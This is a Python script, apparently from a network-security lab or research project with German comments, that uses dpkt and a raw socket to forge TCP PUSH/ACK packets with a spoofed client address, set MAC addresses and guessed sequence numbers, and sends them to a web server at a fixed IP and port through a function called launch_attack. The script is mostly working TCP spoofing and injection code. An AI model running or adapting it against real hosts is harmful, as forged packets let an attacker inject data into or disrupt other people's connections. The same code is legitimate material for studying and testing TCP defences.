import socket
import binascii
import psutil
import time
from datetime import datetime, timedelta
import random
import dpkt
from pylibpcap import sniff
from util.netutil import get_mac_for_ip,fetch_local_details, IP, TCP, ARP
from util.sniffutil import Pcap
from getmac import get_mac_address as gma
from dpkt import ip, tcp, ethernet
import sys

iface_name = ""
target_ip = "134.96.225.80" #webserver ip
target_port = 8080          #webserver port
target_eth_adr = b''        #webserver mac
local_ip = "134.96.225.79"  #local ip
local_eth_adr = b''         #local mac
spoofed_ip = local_ip       #client ip
spoofed_eth_adr = b''       #client mac

print("[+] Starting...")

#Ermittelt und konvertiert ua. MAC Adressen für die Nutzung mit dpkt
def setup():
    global iface_name
    global local_ip
    global local_eth_adr
    global target_eth_adr
    global spoofed_eth_adr

    #get local ip and mac adress
    iface_name, local_ip, local_eth_adr = fetch_local_details()
    iface_name = "lo"
    print(f'[+] Interface set to {iface_name}!')
    print(f'[+] IP {local_ip} and mac address {local_eth_adr} for the local device')
    local_eth_adr = bytes.fromhex(local_eth_adr.replace(":", " "))

    target_eth_adr = '34:17:eb:cb:d4:14'
    print(f"[+] Server ({target_ip}:{target_port}) at {target_eth_adr}")
    target_eth_adr = bytes.fromhex(target_eth_adr.replace(":", ""))
    
    spoofed_eth_adr = '2c:4d:54:d7:b4:e0'
    print(f"[+] Client ({spoofed_ip}) at {spoofed_eth_adr}")
    spoofed_eth_adr = bytes.fromhex(spoofed_eth_adr.replace(":", ""))
    print("[+] Setup complete!")

#Sendet die bereits erstellten Pakete in Reihenfolge
def launch_attack(probes, sock, msNum):
    #pcap = Pcap()
    #pcap.activate()

    for pkt in probes:
       status =  sock.send(bytes(pkt))

    #timestamps = pcap.deactivate(msNum)

    #diff = timestamps[1] - timestamps[0]
    #diffMs = diff*1000.0
    return 0;
    #return diffMs

def main():
    
    #Erstelle ein Spoofed Request     
    spoofed = []
    start = 2451102470
    ack = 3228492072
    sequence = list(range(1,11))
    sequence = [element * 10 for element in sequence]
    
    random.shuffle(sequence)
    
    for i in range(0,10):
        spoofedTCP = tcp.TCP()
        spoofedTCP.sport = 54321
        spoofedTCP.dport = target_port
        spoofedTCP.seq = start + sequence[i]
        spoofedTCP.ack = ack
        spoofedTCP.win = 502
        spoofedTCP.flags = sum([tcp.TH_PUSH,tcp.TH_ACK])
        spoofedTCP.data = b"Hello World!"

        spoofedIP = ip.IP()
        spoofedIP.p = ip.IP_PROTO_TCP
        spoofedIP.df = 1 
        spoofedIP.id = 0
        spoofedIP.src = socket.inet_pton(socket.AF_INET,spoofed_ip)
        spoofedIP.dst = socket.inet_pton(socket.AF_INET,target_ip)
        spoofedIP.data = spoofedTCP
        
        spoofedETH = ethernet.Ethernet()
        spoofedETH.type = ethernet.ETH_TYPE_IP
        spoofedETH.data = spoofedIP
        spoofedETH.src = local_eth_adr
        spoofedETH.dst = target_eth_adr
    
        spoofed.append(spoofedETH)

    #Probes
    tcpP = TCP(sport=55555, dport=target_port, flags=[dpkt.tcp.TH_SYN])
    ipP = IP((local_ip,local_eth_adr), (target_ip,target_eth_adr), tcpP.build())
    
    #probes = [ipP.build()] + spoofed + [ipP.build()]
    probes = spoofed
    name = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    with open(f"logs/{name}.csv","a") as logFile:
        
        logFile.write("values\n")
        
        for i in range(0,1):
            print(f"[+] {i+1}/100",end="\r")
            with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, dpkt.ip.IP_PROTO_IP) as sock:
                sock.bind((iface_name,1))
                logFile.write(str(launch_attack(probes, sock,2))+"\n")

if __name__ == "__main__":
    #Fixt den Prozess auf eine bestimmte CPU
    print(f"[?] Available cpu's: {psutil.cpu_count()}" )
    p = psutil.Process()
    print(f"[?] CPU list: {p.cpu_affinity()}")
    p.cpu_affinity([2])
    print("[?] CPU set to 2")


    setup()
    print("[+] Running...")
    
    main()
    
    print("\n") 
    print("[+] Done!")
